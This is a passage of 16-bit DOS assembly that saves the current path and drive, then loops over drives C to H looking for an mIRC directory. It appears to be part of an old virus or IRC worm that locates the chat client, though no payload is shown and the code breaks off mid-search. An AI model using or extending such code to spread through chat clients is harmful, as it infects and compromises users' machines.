 mirc:          mov    ah,47h                   ; Save current path
                sub    dx,dx
                lea    si,[bp+path]
                int    21h

                mov    ah,19h                   ; Get current drive
                int    21h
                mov    byte ptr [bp+drive],al

                mov    si,1
 drive_loop:    inc    si                       ; Drive = C
                cmp    si,9                     ; Check 8 drives
                jz     mirc_not_fnd

                mov    ah,0eh                   ; Try to change drive
                mov    dx,si
                int    21h

                mov    ah,3bh                   ; Search for mIRC directory
                lea    dx,[bp+mirc_cat]
